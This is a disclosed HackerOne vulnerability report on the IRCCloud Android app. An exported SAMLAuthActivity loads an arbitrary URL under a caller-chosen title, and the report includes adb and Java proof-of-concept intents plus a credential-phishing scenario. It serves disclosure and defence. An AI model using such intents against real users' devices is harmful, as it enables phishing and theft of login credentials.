---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '283058'
original_report_id: '283058'
title: '[IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity'
team_handle: irccloud
created_at: '2017-10-26T11:30:14.005Z'
disclosed_at: '2017-11-03T11:37:05.224Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
asset_identifier: com.irccloud.android
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
---

# [IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity

## Metadata

- HackerOne Report ID: 283058
- Weakness: 
- Program: irccloud
- Disclosed At: 2017-11-03T11:37:05.224Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi, I'd like to report a bug which allow to open arbitrary URLs in ```com.irccloud.android.activity.SAMLAuthActivity```

This activity is exported:
```xml
        <activity android:name="com.irccloud.android.activity.SAMLAuthActivity" android:theme="@style/dawn" android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
```
it means that it can be accessed by any third-party apps installed on the same device. On the newest Androids it also could be exploited by Android Instant Apps directly from a web-browser.

In file ```  ``` can see that it opens attacker provided URLs
```java
        if (getIntent() == null || !getIntent().hasExtra("auth_url")) {
            finish();
            return;
        }
        getSupportActionBar().setTitle(getIntent().getStringExtra("title"));
        this.mWebView.loadUrl(getIntent().getStringExtra("auth_url"));
```

PoC from ADB:
```
adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity -e title "ATTAAACK" -e auth_url "http://google.com/"
```

PoC in Java:
```java
        Intent intent = new Intent();
        intent.setClassName("com.irccloud.android", "com.irccloud.android.activity.SAMLAuthActivity");
        intent.putExtra("title", "ATTAAACK");
        intent.putExtra("auth_url", "http://google.com/");
        startActivity(intent);
```

Result:
{F233002}
{F233003}

It's dangerous because user doesn't see real URL. Attacker can open anything and specify any title (like "IRCCloud: Login Required"), and using that trick steal user credentials.

You can test this issue by yourself, APK is attached

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
